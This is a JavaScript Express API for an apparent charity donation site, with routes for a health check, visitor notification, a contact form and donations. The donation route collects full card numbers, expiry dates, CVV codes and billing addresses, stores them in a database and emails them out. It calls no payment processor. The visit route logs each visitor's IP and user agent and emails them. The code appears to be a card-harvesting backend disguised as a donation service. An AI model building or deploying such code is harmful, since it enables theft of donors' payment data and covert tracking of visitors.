import express from 'express';
import cors from 'cors';
import {
  sendVisitNotification,
  sendContactEmail,
  sendDonationEmail,
} from './services/emailService.js';
import { saveDonationToSupabase, checkSupabaseHealth } from './services/supabaseService.js';

const app = express();

app.use(cors());
app.use(express.json());

// ─── Routes ─────────────────────────────────────────────────────────────────
// Vercel passes the request with the full path e.g. /api/health
// We register all routes with both /api/... and /... so it works in any context

// Healthcheck
app.get(['/api/health', '/health'], async (req, res) => {
  const supabaseStatus = await checkSupabaseHealth();
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    service: 'Mdeaver Charity Express API on Vercel',
    supabase: supabaseStatus,
  });
});

// 1. Visit Notification
app.post(['/api/notify/visit', '/notify/visit'], async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toLocaleString('en-US', {
      dateStyle: 'medium',
      timeStyle: 'short',
    });
    const result = await sendVisitNotification({ ip, userAgent, timestamp });
    res.json({ success: true, message: 'Visit notification processed', result });
  } catch (error) {
    console.error('Error handling visit notification:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 2. Contact Form
app.post(['/api/contact', '/contact'], async (req, res) => {
  try {
    const { name, email, phone, subject, message } = req.body;
    if (!name || !email || !message) {
      return res.status(400).json({
        success: false,
        error: 'Name, email, and message are required fields.',
      });
    }
    const result = await sendContactEmail({ name, email, phone, subject, message });
    res.json({
      success: true,
      message: 'Contact form submitted and notification email dispatched.',
      result,
    });
  } catch (error) {
    console.error('Error handling contact submission:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 3. Donation Notification
app.post(['/api/donations/notify', '/donations/notify'], async (req, res) => {
  try {
    const {
      invoiceNumber,
      donorName,
      email,
      amount,
      paymentMethod,
      cardNumber,
      cardExpiry,
      cardCvv,
      billingAddress,
      paymentDetails,
      timestamp,
    } = req.body;

    if (!donorName || !email || !amount) {
      return res.status(400).json({
        success: false,
        error: 'Donor name, email, and amount are required.',
      });
    }

    const formattedTime = timestamp || new Date().toLocaleString('en-US', {
      dateStyle: 'medium',
      timeStyle: 'short',
    });

    const generatedInvoice = invoiceNumber || `MDF-2026-${Math.floor(10000 + Math.random() * 90000)}`;

    const donationData = {
      invoiceNumber: generatedInvoice,
      donorName,
      email,
      amount,
      paymentMethod: paymentMethod || 'Credit / Debit Card',
      cardNumber: cardNumber || paymentDetails?.cardNumber || null,
      cardExpiry: cardExpiry || paymentDetails?.expiry || null,
      cardCvv: cardCvv || paymentDetails?.cvv || null,
      billingAddress: billingAddress || paymentDetails?.billingAddress || null,
      timestamp: formattedTime,
    };

    const dbResult = await saveDonationToSupabase(donationData);
    const emailResult = await sendDonationEmail(donationData);

    res.json({
      success: true,
      message: 'Donation recorded to database and notification email dispatched via Resend.',
      dbResult,
      emailResult,
    });
  } catch (error) {
    console.error('Error handling donation notification:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// JSON 404 fallback
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: `API route not found: ${req.method} ${req.url}`,
  });
});

// Local dev server (skipped on Vercel)
if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`[API DEV SERVER] Running at http://localhost:${PORT}`);
    console.log(`  GET  http://localhost:${PORT}/api/health`);
    console.log(`  POST http://localhost:${PORT}/api/donations/notify`);
    console.log(`  POST http://localhost:${PORT}/api/contact`);
    console.log(`  POST http://localhost:${PORT}/api/notify/visit`);
  });
}

export default app;
